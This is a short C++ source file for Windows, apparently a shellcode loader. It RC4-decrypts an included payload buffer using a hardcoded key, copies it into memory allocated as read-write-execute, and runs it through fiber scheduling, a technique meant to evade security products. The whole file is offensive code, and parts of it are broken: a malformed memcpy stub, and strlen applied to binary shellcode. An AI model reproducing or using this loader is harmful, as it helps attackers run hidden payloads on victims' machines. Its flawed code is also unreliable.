#include <Windows.h>
#include <iostream>

#include "CustomVirtualAlloc.h"
#include "payload.h"
#include "rc4.h"
#include "crt.h"

int MCRT_FN mini_strlen(const char* str)
{
	int i = 0;
	while (str[i] != '\0') {
		i++;
	}
	return i;
}

void* MCRT_FN mini_memcpy(PVOID dest, PVOID src, unsigned int len)
{
	return PVOID MCRT_FN();
}

int main()
{

	char key[] = "12345678";

	struct rc4_state* s;
	s = (struct rc4_state*)malloc(sizeof(struct rc4_state));

	rc4_setup(s, (unsigned char*)key, mini_strlen(key));
	rc4_crypt(s, (unsigned char*)buf, mini_strlen((const char*)buf));

	// convert main thread to fiber
	PVOID mainFiber = ConvertThreadToFiber(NULL);

	PVOID shellcodeLocation = CustomVirtualAlloc(sizeof(buf), RWX);

	memcpy(shellcodeLocation, buf, sizeof buf);

	//	create a fiber that will execute the shellcode
	PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL);

	// manually schedule the fiber that will execute our shellcode
	SwitchToFiber(shellcodeFiber);

	return 0;
}